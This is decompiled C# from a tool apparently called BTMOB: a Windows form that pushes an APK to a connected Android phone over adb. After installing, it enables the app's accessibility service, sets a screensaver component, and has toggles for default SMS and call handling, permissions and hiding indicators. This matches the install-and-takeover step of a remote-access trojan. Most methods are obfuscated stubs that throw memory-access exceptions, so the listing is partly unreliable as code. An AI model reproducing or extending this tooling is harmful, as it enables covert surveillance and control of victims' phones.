using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Diagnostics;
using System.Runtime.CompilerServices;
using System.Threading;
using System.Windows.Forms;
using DrakeUI.Framework;
using Microsoft.VisualBasic.CompilerServices;

namespace BTMOB;

[DesignerGenerated]
public class apkinstaller : Form
{
	private IContainer components;

	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("Panel3")]
	private Panel _Panel3;

	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("installbtn")]
	private DrakeUIButtonIcon _installbtn;

	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("Panel4")]
	private Panel _Panel4;

	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("Panel5")]
	private Panel _Panel5;

	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("mytitle")]
	private Label _mytitle;

	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("myico")]
	private PictureBox _myico;

	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("closbtn")]
	private DrakeUIButtonIcon _closbtn;

	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("selectapk")]
	private DrakeUIButtonIcon _selectapk;

	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("installworker")]
	private BackgroundWorker _installworker;

	private Dictionary<string, string> deviceMap;

	[field: AccessedThroughProperty("Combophones")]
	internal virtual DrakeUIComboBox Combophones
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("Panel2")]
	internal virtual Panel Panel2
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("Label1")]
	internal virtual Label Label1
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	internal virtual Panel Panel3
	{
		[CompilerGenerated]
		get
		{
			return _Panel3;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			MouseEventHandler value2 = Panel5_MouseDown;
			Panel panel = _Panel3;
			if (panel != null)
			{
				panel.MouseDown -= value2;
			}
			_Panel3 = value;
			panel = _Panel3;
			if (panel != null)
			{
				panel.MouseDown += value2;
			}
		}
	}

	internal virtual DrakeUIButtonIcon installbtn
	{
		[CompilerGenerated]
		get
		{
			return _installbtn;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			EventHandler value2 = installbtn_Click;
			DrakeUIButtonIcon drakeUIButtonIcon = _installbtn;
			if (drakeUIButtonIcon != null)
			{
				drakeUIButtonIcon.Click -= value2;
			}
			_installbtn = value;
			drakeUIButtonIcon = _installbtn;
			if (drakeUIButtonIcon != null)
			{
				drakeUIButtonIcon.Click += value2;
			}
		}
	}

	internal virtual Panel Panel4
	{
		[CompilerGenerated]
		get
		{
			return _Panel4;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			MouseEventHandler value2 = Panel5_MouseDown;
			Panel panel = _Panel4;
			if (panel != null)
			{
				panel.MouseDown -= value2;
			}
			_Panel4 = value;
			panel = _Panel4;
			if (panel != null)
			{
				panel.MouseDown += value2;
			}
		}
	}

	[field: AccessedThroughProperty("DrakeWidth_W6")]
	internal virtual DrakeWidth_W DrakeWidth_W6
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("DrakeWidth_W8")]
	internal virtual DrakeWidth_W DrakeWidth_W8
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("DrakeWidth_W7")]
	internal virtual DrakeWidth_W DrakeWidth_W7
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("DrakeWidth_W5")]
	internal virtual DrakeWidth_W DrakeWidth_W5
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	internal virtual Panel Panel5
	{
		[CompilerGenerated]
		get
		{
			return _Panel5;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			MouseEventHandler value2 = Panel5_MouseDown;
			Panel panel = _Panel5;
			if (panel != null)
			{
				panel.MouseDown -= value2;
			}
			_Panel5 = value;
			panel = _Panel5;
			if (panel != null)
			{
				panel.MouseDown += value2;
			}
		}
	}

	public virtual Label mytitle
	{
		[CompilerGenerated]
		get
		{
			return _mytitle;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			MouseEventHandler value2 = Panel5_MouseDown;
			Label label = _mytitle;
			if (label != null)
			{
				label.MouseDown -= value2;
			}
			_mytitle = value;
			label = _mytitle;
			if (label != null)
			{
				label.MouseDown += value2;
			}
		}
	}

	public virtual PictureBox myico
	{
		[CompilerGenerated]
		get
		{
			return _myico;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			MouseEventHandler value2 = Panel5_MouseDown;
			PictureBox pictureBox = _myico;
			if (pictureBox != null)
			{
				pictureBox.MouseDown -= value2;
			}
			_myico = value;
			pictureBox = _myico;
			if (pictureBox != null)
			{
				pictureBox.MouseDown += value2;
			}
		}
	}

	[field: AccessedThroughProperty("spl2")]
	internal virtual DrakeWidth_W spl2
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	internal virtual DrakeUIButtonIcon closbtn
	{
		[CompilerGenerated]
		get
		{
			return _closbtn;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			EventHandler value2 = closbtn_Click;
			DrakeUIButtonIcon drakeUIButtonIcon = _closbtn;
			if (drakeUIButtonIcon != null)
			{
				drakeUIButtonIcon.Click -= value2;
			}
			_closbtn = value;
			drakeUIButtonIcon = _closbtn;
			if (drakeUIButtonIcon != null)
			{
				drakeUIButtonIcon.Click += value2;
			}
		}
	}

	internal virtual DrakeUIButtonIcon selectapk
	{
		[CompilerGenerated]
		get
		{
			return _selectapk;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			EventHandler value2 = selectapk_Click;
			DrakeUIButtonIcon drakeUIButtonIcon = _selectapk;
			if (drakeUIButtonIcon != null)
			{
				drakeUIButtonIcon.Click -= value2;
			}
			_selectapk = value;
			drakeUIButtonIcon = _selectapk;
			if (drakeUIButtonIcon != null)
			{
				drakeUIButtonIcon.Click += value2;
			}
		}
	}

	[field: AccessedThroughProperty("packagetext")]
	internal virtual DrakeUITextBox packagetext
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("Panel1")]
	internal virtual Panel Panel1
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("apkpathtext")]
	internal virtual DrakeUITextBox apkpathtext
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("Panel7")]
	internal virtual Panel Panel7
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("Panel9")]
	internal virtual Panel Panel9
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("DrakeUISymbolLabel1")]
	internal virtual DrakeUISymbolLabel DrakeUISymbolLabel1
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("CheckGplay")]
	internal virtual DrakeUIOSSwitch CheckGplay
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("Panel6")]
	internal virtual Panel Panel6
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("prim1")]
	internal virtual DrakeUISymbolLabel prim1
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("checkaccess")]
	internal virtual DrakeUIOSSwitch checkaccess
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("Panel8")]
	internal virtual Panel Panel8
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("Panel10")]
	internal virtual Panel Panel10
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("DrakeUISymbolLabel2")]
	internal virtual DrakeUISymbolLabel DrakeUISymbolLabel2
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("checkprimes")]
	internal virtual DrakeUIOSSwitch checkprimes
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("Panel11")]
	internal virtual Panel Panel11
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("DrakeUISymbolLabel3")]
	internal virtual DrakeUISymbolLabel DrakeUISymbolLabel3
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("checkindecators")]
	internal virtual DrakeUIOSSwitch checkindecators
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("Panel12")]
	internal virtual Panel Panel12
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("DrakeUISymbolLabel4")]
	internal virtual DrakeUISymbolLabel DrakeUISymbolLabel4
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("chackbackprims")]
	internal virtual DrakeUIOSSwitch chackbackprims
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("checkreplace")]
	internal virtual DrakeUICheckBox checkreplace
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("loglabel")]
	internal virtual RichTextBox loglabel
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	internal virtual BackgroundWorker installworker
	{
		[CompilerGenerated]
		get
		{
			return _installworker;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			DoWorkEventHandler value2 = installworker_DoWork;
			BackgroundWorker backgroundWorker = _installworker;
			if (backgroundWorker != null)
			{
				backgroundWorker.DoWork -= value2;
			}
			_installworker = value;
			backgroundWorker = _installworker;
			if (backgroundWorker != null)
			{
				backgroundWorker.DoWork += value2;
			}
		}
	}

	[field: AccessedThroughProperty("Panel14")]
	internal virtual Panel Panel14
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("DrakeUISymbolLabel6")]
	internal virtual DrakeUISymbolLabel DrakeUISymbolLabel6
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("defcalls")]
	internal virtual DrakeUIOSSwitch defcalls
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("Panel13")]
	internal virtual Panel Panel13
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("DrakeUISymbolLabel5")]
	internal virtual DrakeUISymbolLabel DrakeUISymbolLabel5
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("defsms")]
	internal virtual DrakeUIOSSwitch defsms
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[MethodImpl(MethodImplOptions.NoInlining)]
	public apkinstaller()
	{
		throw new AccessViolationException("Attempted to read or write protected memory. This is often an indication that other memory is corrupt.");
	}

	[MethodImpl(MethodImplOptions.NoInlining)]
	[DebuggerNonUserCode]
	protected override void Dispose(bool disposing)
	{
		throw new AccessViolationException("Attempted to read or write protected memory. This is often an indication that other memory is corrupt.");
	}

	[System.Runtime.CompilerServices.MethodImpl(System.Runtime.CompilerServices.MethodImplOptions.NoInlining)]
	[System.Diagnostics.DebuggerStepThrough]
	private void InitializeComponent()
	{
		throw new System.AccessViolationException("Attempted to read or write protected memory. This is often an indication that other memory is corrupt.");
	}

	[MethodImpl(MethodImplOptions.NoInlining)]
	private void apkinstaller_Load(object sender, EventArgs e)
	{
		throw new AccessViolationException("Attempted to read or write protected memory. This is often an indication that other memory is corrupt.");
	}

	[MethodImpl(MethodImplOptions.NoInlining)]
	public void printlog(string log)
	{
		throw new AccessViolationException("Attempted to read or write protected memory. This is often an indication that other memory is corrupt.");
	}

	[MethodImpl(MethodImplOptions.NoInlining)]
	private void loadphones()
	{
		throw new AccessViolationException("Attempted to read or write protected memory. This is often an indication that other memory is corrupt.");
	}

	[MethodImpl(MethodImplOptions.NoInlining)]
	private string RunCommand(string command, string arguments)
	{
		throw new AccessViolationException("Attempted to read or write protected memory. This is often an indication that other memory is corrupt.");
	}

	[MethodImpl(MethodImplOptions.NoInlining)]
	private void selectapk_Click(object sender, EventArgs e)
	{
		throw new AccessViolationException("Attempted to read or write protected memory. This is often an indication that other memory is corrupt.");
	}

	[MethodImpl(MethodImplOptions.NoInlining)]
	private void installbtn_Click(object sender, EventArgs e)
	{
		throw new AccessViolationException("Attempted to read or write protected memory. This is often an indication that other memory is corrupt.");
	}

	[MethodImpl(MethodImplOptions.NoInlining)]
	private void ConfigureAppCompletely(string serial, string packagename)
	{
		throw new AccessViolationException("Attempted to read or write protected memory. This is often an indication that other memory is corrupt.");
	}

	[MethodImpl(MethodImplOptions.NoInlining)]
	private string GetAppUid(string serial, string packagename)
	{
		throw new AccessViolationException("Attempted to read or write protected memory. This is often an indication that other memory is corrupt.");
	}

	[MethodImpl(MethodImplOptions.NoInlining)]
	private void EnableAccessibilityService(string serial, string component, string packagename)
	{
		throw new AccessViolationException("Attempted to read or write protected memory. This is often an indication that other memory is corrupt.");
	}

	[MethodImpl(MethodImplOptions.NoInlining)]
	private string FindAccessibilityComponent(string serial, string packagename)
	{
		throw new AccessViolationException("Attempted to read or write protected memory. This is often an indication that other memory is corrupt.");
	}

	[MethodImpl(MethodImplOptions.NoInlining)]
	private string FindDreamComponent(string serial, string packagename)
	{
		throw new AccessViolationException("Attempted to read or write protected memory. This is often an indication that other memory is corrupt.");
	}

	[MethodImpl(MethodImplOptions.NoInlining)]
	private void closbtn_Click(object sender, EventArgs e)
	{
		throw new AccessViolationException("Attempted to read or write protected memory. This is often an indication that other memory is corrupt.");
	}

	[MethodImpl(MethodImplOptions.NoInlining)]
	private void Panel5_MouseDown(object sender, MouseEventArgs e)
	{
		throw new AccessViolationException("Attempted to read or write protected memory. This is often an indication that other memory is corrupt.");
	}

	private void installworker_DoWork(object sender, DoWorkEventArgs e)
	{
		string text = packagetext.Text.Trim();
		string key = Combophones.SelectedItem.ToString();
		string arg = apkpathtext.Text.Trim();
		bool flag = true;
		string text2 = deviceMap[key];
		string arg2 = EXGuarder._4D542E28;
		printlog(BTConst.checkInstalledAppsLogstr);
		string text3 = RunCommand(MyRes.adb_Path, string.Format(EXGuarder._79423F6F, text2, text));
		if (!string.IsNullOrEmpty(text3) && text3.Trim().StartsWith(EXGuarder._5342791A))
		{
			if (!checkreplace.Checked)
			{
				MyMsg.Show(BTConst.appAlreadyInstalledTitlestr, BTConst.appAlreadyInstalledMessagestr, MyMsg.msgtype.Confirm, use_no: false, showskip: false, EXGuarder._2D732536);
				return;
			}
			printlog(BTConst.removingInstalledVersionsLogstr);
			RunCommand(MyRes.adb_Path, string.Format(EXGuarder._7640425F, text2, text));
			RunCommand(MyRes.adb_Path, string.Format(EXGuarder._492E0255, text2, text));
		}
		Thread.Sleep(2000);
		while (true)
		{
			printlog(BTConst.installingApkLogstr);
			string arguments = string.Format(EXGuarder._3E1D1A1B, text2, arg2, arg);
			string text4 = RunCommand(MyRes.adb_Path, arguments);
			if (text4.Contains(EXGuarder._4E3F4C39) || text4.StartsWith(EXGuarder._6D352477))
			{
				printlog(BTConst.failedPrefixLogstr + text4);
				BTAlerter.Warnings(BTConst.apkInstallFailedTitlestr + EXGuarder._5F027979 + text4);
				return;
			}
			printlog(BTConst.checkInstalledAppsLogstr);
			text3 = RunCommand(MyRes.adb_Path, string.Format(EXGuarder._79423F6F, text2, text));
			if (!(string.IsNullOrEmpty(text3) | !text3.Trim().StartsWith(EXGuarder._5342791A)))
			{
				break;
			}
			if (flag)
			{
				flag = false;
				printlog(EXGuarder._6764120D);
				arg2 = EXGuarder._356E6B64;
				continue;
			}
			printlog(EXGuarder._6A050636);
			return;
		}
		Thread.Sleep(2000);
		printlog(string.Format(EXGuarder._62361E64, text));
		RunCommand(MyRes.adb_Path, string.Format(EXGuarder._162D0642, text2, text));
		RunCommand(MyRes.adb_Path, string.Format(EXGuarder._6F17180F, text2, text));
		RunCommand(MyRes.adb_Path, string.Format(EXGuarder._0A5C2056, text2, text));
		printlog(BTConst.checkingAccessibilityLogstr);
		if (checkaccess.Active)
		{
			string text5 = FindAccessibilityComponent(text2, text);
			if (string.IsNullOrEmpty(text5))
			{
				printlog(BTConst.accessibilityFailedPrefixstr + BTConst.accessibilityServiceNotFoundstr);
				printlog(BTConst.skippingNextStepLogstr);
			}
			else
			{
				EnableAccessibilityService(text2, text5, text);
			}
		}
		string text6 = FindDreamComponent(text2, text);
		if (!string.IsNullOrEmpty(text6))
		{
			RunCommand(MyRes.adb_Path, string.Format(EXGuarder._112C7833, text2));
			RunCommand(MyRes.adb_Path, string.Format(EXGuarder._244A6133, text2));
			RunCommand(MyRes.adb_Path, string.Format(EXGuarder._083F5D3B, text2));
			RunCommand(MyRes.adb_Path, string.Format(EXGuarder._2C225279, text2, text6));
		}
		ConfigureAppCompletely(text2, text);
		Invoke((VB_0024AnonymousDelegate_0)([SpecialName] () =>
		{
			MyMsg.Show("Apk installer", BTConst.apkInstalledSuccessstr, MyMsg.msgtype.Confirm, use_no: false);
		}));
	}
}
